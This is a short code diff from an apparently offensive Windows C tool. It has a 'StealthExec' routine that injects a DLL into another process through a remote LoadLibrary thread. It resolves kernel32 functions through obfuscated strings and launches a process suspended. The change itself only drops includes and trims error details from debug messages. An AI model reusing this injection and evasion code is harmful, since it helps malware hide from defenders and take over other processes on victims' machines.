@@ -1,6 +1,4 @@
 #include <windows.h>
-#include <stdio.h>
-#include <stdbool.h>
 #include "detector.h"
 #include "evasion.h"
 
@@ -70,7 +68,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
     {
-        myDebug(DEBUG_ERROR, "Thread creation failed. Err: %lu", GetLastError());
+        myDebug(DEBUG_ERROR, "Thread creation failed.");
         return;
     }
     else
@@ -81,7 +79,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
         pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
         if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
         {
-            myDebug(DEBUG_ERROR, "WaitForSingleObject failed! Error: %lu", GetLastError());
+            myDebug(DEBUG_ERROR, "WaitForSingleObject failed!");
             pTerminateThread_t pTerminateThread = (pTerminateThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]TerminateThread"));
             pTerminateThread(hThreadRemote, 0); // Kill stuck thread
             pCloseHandle(hThreadRemote);
@@ -132,7 +130,7 @@ int main(int argc, char *argv[])
 
     if (!pCPA(obfs_decode(DECKEY, procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
-        myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
+        myDebug(DEBUG_ERROR, "Could not create %s.", procName);
         return -1;
     }
 
